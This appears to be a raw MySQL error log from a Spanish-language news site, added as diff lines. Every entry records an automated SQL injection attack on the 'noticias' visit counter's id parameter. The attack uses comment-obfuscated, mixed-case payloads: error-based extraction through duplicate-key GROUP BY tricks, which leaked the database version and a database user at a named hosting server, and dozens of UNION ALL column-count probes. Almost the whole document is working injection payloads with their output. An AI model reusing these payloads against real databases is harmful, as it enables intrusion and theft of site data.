+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/dAtAbAsE(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:04:50
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 16:04:47
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chhoy@ps447048.dreamhost.com!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/uSeR(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 15:40:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39
+
+Time : 15:40:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39
+
+Time : 15:40:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39
+
+Time : 15:40:06
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39
+
+Time : 15:40:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39
+
+Time : 15:40:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39
+
+Time : 15:40:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39
+
+Time : 15:40:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39
+
+Time : 15:40:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39
+
+Time : 15:40:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39
+
+Time : 15:40:04
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39
+
+Time : 15:40:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39
+
+Time : 15:40:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39
+
+Time : 15:40:03
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39
+
+Time : 15:40:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39
+
+Time : 15:40:02
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39
+
+Time : 15:40:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39
+
+Time : 15:40:01
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39
+
+Time : 15:40:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39
+
+Time : 15:40:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39
+
+Time : 15:40:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39
+
+Time : 15:40:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39
+
+Time : 15:39:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39
+
+Time : 15:39:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39
+
+Time : 15:39:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39
+
+Time : 15:39:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39
+
+Time : 15:39:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39
+
+Time : 15:39:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39
+
+Time : 15:39:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39
+
+Time : 15:39:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39
+
+Time : 15:39:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39
+
+Time : 15:39:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39,0x39313335313435363233332e39,0x39313335313435363233342e39,0x39313335313435363233352e39
+
+Time : 15:39:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39
+
+Time : 15:39:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 